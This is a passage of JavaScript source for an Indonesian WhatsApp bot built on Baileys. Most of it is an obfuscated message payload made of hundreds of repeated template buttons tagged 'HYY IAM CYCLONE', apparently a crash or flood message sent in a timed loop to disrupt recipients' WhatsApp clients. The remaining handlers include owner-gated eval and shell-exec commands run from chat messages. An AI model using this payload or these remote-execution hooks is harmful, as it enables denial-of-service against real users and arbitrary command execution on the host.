73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quoted':lep}]});}}
await sleep(ms(waktu))
break
case 'delete': case 'del': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                rixx.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break

break
default:


for (let FizzxMods of audionye){
				if (budy === FizzxMods){
		resss = fs.readFileSync(`./lib/${FizzxMods}.opus`)
	SendVnWithAudio(resss)
}
}
}

if (budy.includes('Keren')){
	rixx.sendMessage(m.chat, { text : `Wesss iyaaa donggg 🔥🔥🔥`,contextInfo:{"externalAdReply": {"title": `FizzxMods 🔥`,"body": `Pencet Donggg Link Group Ku`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": ppnyauser,"sourceUrl": `https://chat.whatsapp.com/I4PXxNScx9WAmp5r4np6Is`}}} ,{quoted: m })

	}
	if (budy.includes('keren')){
	rixx.sendMessage(m.chat, { text : `Wesss iyaaa donggg 🔥🔥🔥`,contextInfo:{"externalAdReply": {"title": `FizzxMods 🔥`,"body": `Pencet Donggg Link Group Ku`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": ppnyauser,"sourceUrl": `https://chat.whatsapp.com/I4PXxNScx9WAmp5r4np6Is`}}} ,{quoted: m })
}
	if (budy.startsWith('bot')) {
		robot = fs.readFileSync('./database/haii.opus')
		SendVnWithAudio(robot)
		}
		if (budy.startsWith('Bot')) {
		roboot = fs.readFileSync('./database/haii.opus')
		SendVnWithAudio(roboot)
		}
		if (budy.includes('gabut') || budy.includes('hehe') || budy.includes('apa') || budy.includes('hai') || budy.includes('apasi') || budy.includes('FizzxModss') || budy.includes('haha') || budy.includes('dahlah') || budy.includes('sepi') || budy.includes('wkwk') ||   budy.includes('🗿') || budy.includes('menu')) {
	let mojii = ["🤧","🤨","🗿","🤪","🤫","🤬","🤭","🤮","🤯","🤟","🤠","🤡","🤢","🤣","🤤","🤥","🤐","🤑","🤒","🤓","🤔","🤕","🤖","🤗", "🥰","😍","😘","❤️","🤩"]
			let raan = mojii[Math.floor(Math.random() * mojii.length)]
const reactionMessage = {
    react: {
        text: raan, // use an empty string to remove the reaction
        key: m.key
    }
}
rixx.sendMessage(m.chat, reactionMessage)
}

if (budy.includes('menfess') || budy.includes('confess') || budy.includes('menfes') || budy.includes('confes') || budy.includes('confirm')) {
   let eemmojjii = ["🗿","🤣","🤭","😎","🥰","😍","😇"]
   let iniemoji = eemmojjii[Math.floor(Math.random() * eemmojjii.length)]
   const reactionMessage = {
         react: {
              text: iniemoji,
              key: m.key
     }
}

rixx.sendMessage(m.chat, reactionMessage)
	}
	
if (budy.startsWith('=>')) {
if (!itsMerixx) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m.reply(bang)
}
try {
m.reply(util.format(eval(`(async () => { ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))
}
}
if (budy.startsWith('>')) {
if (!itsMerixx) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
m.reply(String(err))
}
}
if (budy.startsWith('<')) {
if (!itsMerixx) return
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}
if (budy.startsWith('$')){
if (!itsMerixx) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) {
m.reply(stdout)
}
})
}
} catch (err) {
m.reply(util.format(err))
}
} 